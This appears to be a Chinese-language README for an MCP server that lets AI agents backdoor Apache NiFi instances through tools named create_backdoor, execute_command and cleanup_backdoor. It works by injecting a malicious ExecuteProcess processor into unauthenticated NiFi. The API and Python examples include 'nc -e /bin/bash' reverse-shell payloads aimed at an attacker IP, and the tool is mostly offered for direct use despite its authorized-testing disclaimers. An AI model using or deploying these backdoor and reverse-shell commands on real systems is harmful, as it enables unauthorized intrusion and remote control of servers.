# NiFi MCP Server

基于 Apache NiFi 漏洞的 MCP (Model Context Protocol) 服务器，用于授权的安全测试和渗透测试。

## 功能特性

该 MCP 服务器提供三个核心工具用于安全测试：

1. **开启后门** (`create_backdoor`) - 利用 NiFi 漏洞创建后门
2. **执行命令** (`execute_command`) - 通过后门发送系统命令
3. **清理后门** (`cleanup_backdoor`) - 清理 NiFi 中的恶意处理器

## 安装和运行

### 1. 安装依赖

```bash
pip install -r requirements.txt
```

### 2. 配置环境变量

复制并编辑 `.env` 文件：

```bash
# 应用配置
APP_NAME=NiFi MCP Server
APP_VERSION=1.0.0

# 服务器配置
HOST=0.0.0.0
PORT=8000
LOG_LEVEL=INFO

# NiFi 配置
NIFI_BASE_URL=http://target-nifi-server:8080
```

### 3. 运行服务器

```bash
python main.py
```

或者使用 uvicorn：

```bash
uvicorn main:app --host 0.0.0.0 --port 8000
```

## API 接口

### 健康检查

```http
GET /health
```

返回服务器健康状态和目标 NiFi 服务器漏洞状态。

### 开启后门

```http
POST /backdoor/create
Content-Type: application/json

{
    "nifi_url": "http://192.168.1.1:8080",
    "command": "nc -e /bin/bash 192.168.1.129 1234"
}
```

### 执行命令

```http
POST /backdoor/execute
Content-Type: application/json

{
    "nifi_url": "http://192.168.1.1:8080",
    "command": "whoami"
}
```

### 清理后门

```http
POST /backdoor/cleanup
Content-Type: application/json

{
    "nifi_url": "http://192.168.1.1:8080",
    "processor_id": "processor-uuid-here"
}
```

## 使用示例

### 作为 MCP 服务器使用

当作为 MCP 服务器运行时，会自动暴露以下工具：

1. `create_backdoor` - 创建后门
2. `execute_command` - 执行命令
3. `cleanup_backdoor` - 清理后门

### 直接调用 API

```python
import requests

# 创建后门
response = requests.post(
    "http://localhost:8000/backdoor/create",
    json={
        "nifi_url": "http://target-nifi:8080",
        "command": "nc -e /bin/bash attacker-ip 4444"
    }
)

# 执行命令
response = requests.post(
    "http://localhost:8000/backdoor/execute",
    json={
        "nifi_url": "http://target-nifi:8080",
        "command": "ls -la"
    }
)
```

## 安全注意事项

⚠️ **重要提醒**：

- 此工具仅用于授权的安全测试
- 请确保在获得明确许可的情况下使用
- 不要在未授权的系统上使用此工具
- 使用前请了解相关法律法规

## 技术细节

该工具利用了 Apache NiFi 中的以下漏洞：

1. **访问配置泄露** - 通过 `/nifi-api/access/config` 端点检查是否启用身份验证
2. **处理器注入** - 创建恶意的 `ExecuteProcess` 处理器
3. **命令执行** - 通过处理器配置执行系统命令

## 故障排除

### 常见问题

1. **目标不可达**
   - 检查网络连接
   - 验证 NiFi 服务是否运行

2. **漏洞不存在**
   - 确认目标 NiFi 版本存在漏洞
   - 检查是否已启用身份验证

3. **权限不足**
   - 确保网络连接允许访问 NiFi API
   - 检查防火墙设置

### 日志查看

服务器会记录详细的操作日志，包括：

- 请求详情
- 漏洞检查结果
- 命令执行状态
- 错误信息

## 许可证

此项目仅供教育和安全研究目的使用。使用者需要确保遵守当地法律法规。